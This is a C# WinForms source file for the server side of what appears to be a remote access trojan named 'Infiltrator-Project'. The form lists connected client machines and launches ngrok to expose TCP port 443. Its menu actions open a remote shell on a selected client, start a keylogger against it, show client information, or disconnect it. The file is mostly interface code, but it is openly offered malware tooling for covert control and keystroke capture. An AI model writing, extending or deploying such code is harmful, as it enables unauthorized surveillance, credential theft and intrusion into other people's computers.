using System.ComponentModel;
using System.Diagnostics;
using Server.Conexion;
using Server.Cliente;
using System.Timers;

namespace Server
{
    public partial class MainForm : Form
    {
        private readonly BindingList<Cliente.Cliente> clientesConectados = ServerSocket.clientesConectados;
        public static MainForm Instance;

        public MainForm()
        {
            InitializeComponent();
            Instance = this;
            dataGridView1.DataSource = clientesConectados;
        }



        private void Form1_Load(object sender, EventArgs e)
        {
            this.FormClosing += Form1_FormClosing;
            dataGridView1.CellFormatting += dataGridView1_CellFormatting;
            dataGridView1.CellMouseDown += dataGridView1_CellMouseDown;
            ServerSocket.startServer();
            Thread.Sleep(1500);
            Process.Start("ngrok.exe", "tcp 443");


        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void label3_Click(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {

        }

        private void ayudaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "https://github.com/Davinccx/Infiltrator-Project",
                UseShellExecute = true // Necesario para que funcione en .NET Core / .NET 5+
            });
        }

        private void informaciónToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }
        private void dataGridView1_CellMouseDown(object sender, DataGridViewCellMouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                // Establecer la fila seleccionada en el DataGridView
                dataGridView1.ClearSelection();
                dataGridView1.Rows[e.RowIndex].Selected = true;
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Detener el servidor
            ServerSocket.stopServer();

            // Cerrar ngrok si está corriendo
            foreach (var process in Process.GetProcessesByName("ngrok"))
            {
                try
                {
                    process.Kill();
                }
                catch { }
            }

            // Otras limpiezas si usas hilos
            Environment.Exit(0); // Fuerza la finalización de todo el proceso
        }

        public void AgregarOActualizarCliente(Cliente.Cliente cliente)
        {
            if (dataGridView1.InvokeRequired)
            {
                dataGridView1.Invoke(new Action(() => AgregarOActualizarCliente(cliente)));
                return;
            }

            clientesConectados.Add(cliente);

            dataGridView1.AutoResizeColumns(DataGridViewAutoSizeColumnsMode.AllCells);

        }

        public void ActualizarCliente(Cliente.Cliente cliente)
        {
            // Verifica si el cliente ya existe en la lista, si es así, actualízalo.
            var clienteExistente = clientesConectados.FirstOrDefault(c => c.ID == cliente.ID);
            if (clienteExistente != null)
            {
                // Actualiza los campos necesarios, por ejemplo, el estado o la IP.
                clienteExistente.Estado = cliente.Estado;  // Asume que tienes una propiedad ClienteEstado en Cliente.
            }
            else
            {
                // Si el cliente no existe, puedes agregarlo como nuevo.
                clientesConectados.Add(cliente);
            }


        }

        private void dataGridView1_CellFormatting(object sender, DataGridViewCellFormattingEventArgs e)
        {
            // Asegúrate de que estamos en la columna de Estado (en este caso se supone que es la columna 6, puedes ajustarlo según tu caso)
            if (e.RowIndex >= 0 && dataGridView1.Columns[e.ColumnIndex].Name == "Estado")
            {
                // Obtener el valor de la celda (Estado del cliente)
                string estado = dataGridView1.Rows[e.RowIndex].Cells["Estado"].Value.ToString();

                // Cambiar el color de fondo según el estado
                if (estado == "Conectado")
                {
                    e.CellStyle.BackColor = Color.Green; // Verde para "Conectado"
                    e.CellStyle.ForeColor = Color.White; // Texto en blanco
                }
                else if (estado == "Desconectado")
                {
                    e.CellStyle.BackColor = Color.Red; // Rojo para "Desconectado"
                    e.CellStyle.ForeColor = Color.White; // Texto en blanco
                }
                else
                {
                    e.CellStyle.BackColor = Color.White; // Color predeterminado
                    e.CellStyle.ForeColor = Color.Black; // Texto negro
                }
            }
        }

        private void pruebaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count > 0)
            {
                var clienteSeleccionado = dataGridView1.SelectedRows[0].DataBoundItem as Server.Cliente.Cliente;
                int idCliente = clienteSeleccionado.ID;
                if (clienteSeleccionado != null && clienteSeleccionado.Estado != "Desconectado")
                {
                    Shell shell = new Shell(idCliente, ServerSocket.getClientById(idCliente));
                    shell.Show();
                }
                else
                {
                    MessageBox.Show("Debe seleccionar un cliente conectado o válido.");
                }
            }
            else
            {
                MessageBox.Show("[ERROR] No hay clientes conectados.");
            }
        }

        private void xDToolStripMenuItem_Click(object sender, EventArgs e)
        {

            if (dataGridView1.SelectedRows.Count > 0)
            {
                var clienteSeleccionado = dataGridView1.SelectedRows[0].DataBoundItem as Server.Cliente.Cliente;
                int idCliente = clienteSeleccionado.ID;
                if (clienteSeleccionado != null && clienteSeleccionado.Estado != "Desconectado")
                {
                    ServerSocket.disconnectClient(idCliente);
                    MessageBox.Show($"Cliente {idCliente} desconectado satisfactoriamente.");
                }
                else
                {
                    MessageBox.Show("Debe seleccionar un cliente conectado o válido.");
                }
            }
            else
            {
                MessageBox.Show("[ERROR] No hay clientes conectados.");
            }

        }

        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count > 0)
            {
                var clienteSeleccionado = dataGridView1.SelectedRows[0].DataBoundItem as Cliente.Cliente;
                int idCliente = clienteSeleccionado.ID;
                if (clienteSeleccionado != null && clienteSeleccionado.Estado != "Desconectado")
                {
                    Keylogger keylogger = new Keylogger(idCliente, ServerSocket.getClientById(idCliente));
                    keylogger.Show();
                }
                else
                {
                    MessageBox.Show("Debe seleccionar un cliente conectado o válido.");
                }
            }
            else
            {
                MessageBox.Show("[ERROR] No hay clientes conectados.");
            }
        }

        private void informaciónToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            if (dataGridView1.SelectedRows.Count > 0)
            {
                var clienteSeleccionado = dataGridView1.SelectedRows[0].DataBoundItem as Cliente.Cliente;
                int idCliente = clienteSeleccionado.ID;
                if (clienteSeleccionado != null && clienteSeleccionado.Estado != "Desconectado")
                {
                    ClientInfo clientInfo = new ClientInfo(idCliente, ServerSocket.getClientById(idCliente));
                    clientInfo.Show();
                }
                else
                {
                    MessageBox.Show("Debe seleccionar un cliente conectado o válido.");
                }
            }else
            {
                MessageBox.Show("[ERROR] No hay clientes conectados.");
            }
        }
    }
}
